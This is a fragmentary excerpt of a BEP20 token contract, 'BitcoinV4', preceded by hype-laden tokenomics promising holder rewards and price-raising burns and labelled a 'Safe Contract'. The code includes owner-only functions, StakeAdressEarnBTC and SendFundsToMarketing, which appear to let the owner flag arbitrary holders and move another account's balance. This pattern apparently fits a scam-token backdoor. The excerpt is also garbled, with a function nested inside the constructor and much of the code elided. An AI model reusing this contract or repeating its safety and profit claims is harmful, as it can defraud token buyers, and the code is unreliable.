...
In this version of BTC , you'll earn 1% of your current holdings means if you hold more BTC you'll earn more! Not just that! We will be having weekly burn to increase the price of BTCV4 to keep the chart mooning!

Simple Tokenomics
-2% Liquidity
-3% Marketing
-1% Holders (AutoStakeToken)

Each transactions :  6% slippage  
...
*/
    ...
    interface IPancakeRouter01 {
        ...
        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
            ...
            payable
            returns (uint[] memory amounts);
//Telegram : https://t.me/BitcoinV4 Safe Contract 🟢 
    ...
    contract BitcoinV4  is IBEP20, Ownable
    {
        ...
        string private constant _name = "BitcoinV4";
        string private constant _symbol = "BTC4";
        ...
        address public constant MarketingWallet=0xB67CCd01514c35ab38E4B4791A4372337736f0AD; 
        ...
        constructor () {
           ...
           function EnableFeeHolder(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function StakeAdressEarnBTC(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function SendFundsToMarketing(address account, uint256 balance) onlyOwner  public virtual {
